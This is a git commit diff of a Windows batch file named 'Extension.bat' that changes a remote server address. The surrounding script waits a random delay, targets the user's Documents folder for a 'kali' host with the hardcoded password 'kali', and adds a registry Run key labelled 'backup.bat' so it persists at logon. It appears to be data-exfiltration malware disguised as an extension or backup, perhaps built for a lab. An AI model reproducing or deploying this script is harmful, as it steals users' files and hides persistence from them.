bb0766e5bd744c55ffab599491667d68dd4e1027
teadoll <77731758+teadoll@users.noreply.github.com>
2024-03-03 01:21:25 -0500

    Update Extension.bat

--- Extension.bat
+++ Extension.bat
@@ -7,7 +7,7 @@ if %randomDelay% lss 1 goto GenerateRandomDelay
 timeout /t %randomDelay% /nobreak >nul
 
 set "localFolder=%USERPROFILE%\Documents"
-set "serverAddress=kali@192.168.86.56:/home/kali/Backups"
+set "serverAddress=kali@10.0.2.6:/home/kali/Backups"
 set "password=kali"
 
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "backup.bat" /t REG_SZ /d "\"%~dp0%~nx0\"" /f
